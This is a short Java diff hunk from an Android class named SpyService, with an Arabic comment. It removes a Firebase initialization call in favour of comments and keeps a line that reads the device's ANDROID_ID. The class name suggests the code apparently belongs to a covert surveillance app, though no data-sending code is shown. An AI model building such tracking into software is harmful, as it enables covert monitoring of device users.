@@ -77,8 +77,8 @@ public class SpyService extends Service {
         context = this;
         
         // تهيئة Firebase
-        if (FirebaseApp.getApps(this).isEmpty()) {
-            FirebaseApp.initializeApp(this);
+        if (FirebaseApp.getApps(this).isEmpty()) { // Firebase already initialized in MainActivity }
+            // Firebase already initialized in MainActivity
         }
         
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
